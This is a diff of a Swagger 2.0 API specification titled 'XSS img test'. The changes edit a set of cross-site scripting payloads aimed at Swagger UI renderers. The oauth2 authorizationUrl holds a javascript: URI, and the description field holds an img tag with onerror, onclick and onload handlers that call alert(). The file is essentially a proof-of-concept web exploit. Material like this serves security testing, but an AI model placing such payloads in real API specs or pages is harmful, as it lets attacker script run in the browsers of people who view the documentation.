@@ -2,11 +2,11 @@ swagger: '2.0'
 securityDefinitions:
   a:
     type: oauth2
-    authorizationUrl: javascript:alert(/MrDOoS023/)//
+    authorizationUrl: javascript:alert(document.domain)//
 info:
   version: "1.0.0"
-  title: XSS img test By MrDOoS023
-  description: onload="alert(1)" <img src=https://i.ibb.co/tMRchpj/fapo.jpg onclick="alert(/MrDOoS023/)" onerror="alert(/MrDOoS023/)">
+  title: XSS img test
+  description: onload="alert(1)" <img src=https://academy.avast.com/hubfs/New_Avast_Academy/Hackers/Hacker-Hero-a1.png onclick="alert(2)" onerror="alert(3)">
 paths:
   /:
     get:
